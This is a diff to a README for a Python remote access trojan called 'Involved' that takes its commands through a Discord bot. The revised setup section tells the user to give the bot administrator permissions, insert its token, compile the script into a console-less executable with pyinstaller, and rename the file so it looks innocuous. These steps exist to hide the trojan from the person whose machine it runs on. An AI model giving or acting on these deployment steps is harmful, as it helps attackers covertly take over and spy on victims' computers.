@@ -8,9 +8,17 @@ Python RAT That Uses Discord For Control.
 
 # Help
 
-To Setup Run InvolvedSetup.py After Creating A Discord Bot With Administrator Permissions And Inviting To Your Server (It Is Better To Create A Dedicated Server).
-
-When The Setup Asked For A Token Enter The Bot's Token.
+Create A Discord Bot With Administrator Permissions, Invite It To Your Server.
+Change The Token Variable In Involved.py To Your Bot's Token
+Install The Requirements
+```
+py -m pip install -r requirements.txt
+```
+Now Compile To Exe:
+```
+py -m pyinstaller --onefile --noconsole Involved.py
+```
+Now Rename The File To A Custom Name.
 
 # Commands
 
